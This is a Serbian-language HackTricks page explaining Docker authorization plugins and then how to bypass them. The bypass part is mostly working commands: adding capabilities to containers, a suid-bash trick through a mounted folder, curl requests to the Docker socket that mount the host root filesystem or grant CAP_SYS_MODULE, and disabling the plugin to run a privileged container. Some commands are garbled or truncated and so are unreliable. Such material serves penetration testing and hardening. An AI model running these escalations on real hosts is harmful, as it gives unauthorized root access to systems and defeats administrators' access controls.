# AuthZ& AuthN - Docker Access Authorization Plugin

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

Docker-ov podrazumevani model **autorizacije** je **sve ili ništa**. Svaki korisnik sa dozvolom za pristup Docker demonu može **izvršiti bilo koju** Docker klijent **komandu**. Isto važi i za pozivatelje koji koriste Docker-ov Engine API da bi kontaktirali demon. Ako zahtevate **veću kontrolu pristupa**, možete kreirati **pluginske za autorizaciju** i dodati ih u konfiguraciju vašeg Docker demona. Korišćenjem pluginske za autorizaciju, Docker administrator može **konfigurisati granularne pristupne politike** za upravljanje pristupom Docker demonu.

## Osnovna arhitektura

Docker Auth plugini su **eksterni plugini** koje možete koristiti da **dozvolite/odbijete** **akcije** koje su zatražene od Docker Demona **u zavisnosti** od **korisnika** koji je to zatražio i **akcije** koja je **zatražena**.

[**Sledeće informacije su iz dokumentacije**](https://docs.docker.com/engine/extend/plugins\_authorization/)

Kada se **HTTP zahtev** napravi Docker **demonu** putem CLI-ja ili putem Engine API-ja, podsistem za **autentifikaciju** prosleđuje zahtev instaliranim **pluginskim za autentifikaciju**. Zahtev sadrži korisnika (pozivaoca) i kontekst komande. Plugin je odgovoran za odlučivanje da li **dozvoliti** ili **odbijati** zahtev.

Dole prikazani dijagrami sekvence prikazuju tok dozvole i odbijanja autorizacije:

![Tok dozvole autorizacije](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Tok odbijanja autorizacije](https://docs.docker.com/engine/extend/images/authz\_deny.png)

Svaki zahtev poslat pluginu **uključuje autentifikovanog korisnika, HTTP zaglavlja i telo zahteva/odgovora**. Pluginu se prosleđuju samo **korisničko ime** i **metoda autentifikacije** koja je korišćena. Najvažnije, **ne prosleđuju se korisnički podaci** ili tokeni. Na kraju, **ne sva zahteva/odgovora se šalju** pluginskoj za autorizaciju. Samo ona zahteva/odgovora gde je `Content-Type` ili `text/*` ili `application/json` se šalju.

Za komande koje potencijalno mogu preuzeti HTTP konekciju (`HTTP Upgrade`), kao što je `exec`, pluginska za autorizaciju se poziva samo za početne HTTP zahteve. Kada plugin odobri komandu, autorizacija se ne primenjuje na ostatak toka. Konkretno, podaci u toku strimovanja se ne prosleđuju pluginskim za autorizaciju. Za komande koje vraćaju HTTP odgovor u delovima, kao što su `logs` i `events`, samo HTTP zahtev se šalje pluginskim za autorizaciju.

Tokom obrade zahteva/odgovora, neki tokovi autorizacije mogu zahtevati dodatne upite Docker demonu. Da bi se završili takvi tokovi, plugini mogu pozvati API demona slično kao redovan korisnik. Da bi omogućili ove dodatne upite, plugin mora obezbediti način da administrator konfiguriše odgovarajuće autentifikaciju i sigurnosne politike.

### Više Pluginova

Vi ste odgovorni za **registrovanje** vašeg **plugina** kao deo pokretanja Docker demona. Možete instalirati **više pluginova i povezati ih zajedno**. Ovaj lanac može biti uređen. Svaki zahtev demonu prolazi kroz lanac redom. Samo kada **svi pluginovi odobre pristup** resursu, pristup je odobren.

## Primeri Pluginova

### Twistlock AuthZ Broker

Plugin [**authz**](https://github.com/twistlock/authz) vam omogućava da kreirate jednostavan **JSON** fajl koji će plugin **čitati** kako bi autorizovao zahteve. Na taj način vam pruža mogućnost da veoma lako kontrolišete koje API tačke mogu dostići svaki korisnik.

Ovo je primer koji će dozvoliti Alice i Bob-u da kreiraju nove kontejnere: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

Na stranici [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) možete pronaći vezu između traženog URL-a i akcije. Na stranici [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) možete pronaći vezu između imena akcije i akcije.

### Jednostavan Tutorijal za Plugin

Možete pronaći **lako razumljiv plugin** sa detaljnim informacijama o instalaciji i debagovanju ovde: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Pročitajte `README` i kod `plugin.go` da biste razumeli kako radi.

## Bypass Docker Auth Plugin

### Nabrojavanje pristupa

Glavne stvari koje treba proveriti su **koje tačke su dozvoljene** i **koje vrednosti HostConfig su dozvoljene**.

Da biste izvršili ovu nabrojavanje, možete **koristiti alat** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**

### Nedozvoljen `run --privileged`

#### Minimalne privilegije

```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```

#### Pokretanje kontejnera i dobijanje privilegovanog sesije

U ovom slučaju, sistem administrator **onemogućio je korisnicima da montiraju volumene i pokreću kontejnere sa `--privileged` zastavicom** ili daju bilo kakvu dodatnu sposobnost kontejneru:

```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```

Međutim, korisnik može **kreirati shell unutar pokrenutog kontejnera i dati mu dodatne privilegije**:

```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```

Sada korisnik može da pobegne iz kontejnera koristeći bilo koju od [**prethodno diskutovanih tehnika**](./#privileged-flag) i **poveća privilegije** unutar hosta.

### Montiranje foldera sa dozvolom pisanja

U ovom slučaju, sistem administrator je **onemogućio korisnicima da pokreću kontejnere sa `--privileged` zastavicom** ili daje bilo kakve dodatne mogućnosti kontejneru, i dozvolio je samo montiranje `/tmp` foldera:

```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```

{% hint style="info" %}
Imajte na umu da možda ne možete montirati direktorijum `/tmp`, ali možete montirati **drug direktorijum za pisanje**. Možete pronaći direktorijume za pisanje koristeći: `find / -writable -type d 2>/dev/null`

**Imajte na umu da neće svi direktorijumi na Linux mašini podržavati suid bit!** Da biste proverili koji direktorijumi podržavaju suid bit, pokrenite `mount | grep -v "nosuid"`. Na primer, obično `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` i `/var/lib/lxcfs` ne podržavaju suid bit.

Takođe imajte na umu da ako možete **montirati `/etc`** ili bilo koji drugi direktorijum **koji sadrži konfiguracione fajlove**, možete ih promeniti iz Docker kontejnera kao root kako biste ih zloupotrebili na hostu i eskalirali privilegije (možda izmenom `/etc/shadow`).
{% endhint %}

### Neproverena API tačka

Odgovornost sistem administratora koji konfiguriše ovaj plugin je da kontroliše koje akcije i sa kojim privilegijama svaki korisnik može izvršiti. Stoga, ako administrator koristi **crnu listu** za pristupne tačke i atribute, može se desiti da **zaboravi neke od njih** koje bi omogućile napadaču da eskalira privilegije.

Možete proveriti Docker API na [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/)

### Neproverena JSON struktura

#### Binds u root-u

Moguće je da je sistem administrator prilikom konfigurisanja Docker firewall-a **zaboravio na neki važan parametar** [**API-ja**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) kao što je "**Binds**".\
U sledećem primeru moguće je iskoristiti ovu konfiguraciju da se kreira i pokrene kontejner koji montira root (/) folder hosta:

```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```

{% hint style="warning" %}
Primetite kako u ovom primeru koristimo **`Binds`** parametar kao ključ na nivou korena u JSON-u, ali u API-ju se pojavljuje pod ključem **`HostConfig`**
{% endhint %}

#### Binds u HostConfig-u

Sledite iste instrukcije kao i za **Binds u korenu** izvršavajući ovaj **zahtev** prema Docker API-ju:

```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```

#### Montaže u korenu

Pratite iste instrukcije kao i za **Veze u korenu** izvršavajući ovaj **zahtev** prema Docker API-ju:

```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```

#### Montaže u HostConfig-u

Pratite iste instrukcije kao i za **Veze u root-u** izvršavajući ovaj **zahtev** prema Docker API-ju:

```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```

### Neprovereni JSON atribut

Moguće je da je sistem administrator prilikom konfigurisanja docker firewall-a **zaboravio na neki važan atribut parametra** [**API-ja**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) kao što je "**Capabilities**" unutar "**HostConfig**". U sledećem primeru je moguće iskoristiti ovu lošu konfiguraciju kako bi se kreirao i pokrenuo kontejner sa **SYS\_MODULE** sposobnostima:

```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```

{% hint style="info" %}
**`HostConfig`** je ključ koji obično sadrži **zanimljive** **privilegije** za bekstvo iz kontejnera. Međutim, kao što smo već diskutovali, primetite kako korišćenje Binds izvan njega takođe funkcioniše i može vam omogućiti da zaobiđete ograničenja.
{% endhint %}

### Onemogućavanje dodatka

Ako je **sistemski administrator** **zaboravio** da **zabrani** mogućnost **onemogućavanja** dodatka, možete iskoristiti to da ga potpuno onemogućite!

```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```

Zapamtite da **ponovo omogućite dodatak nakon eskalacije**, inače **restartovanje docker servisa neće raditi**!

### Bypass writeups za Auth Plugin

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

### Reference

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini da podržite HackTricks:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
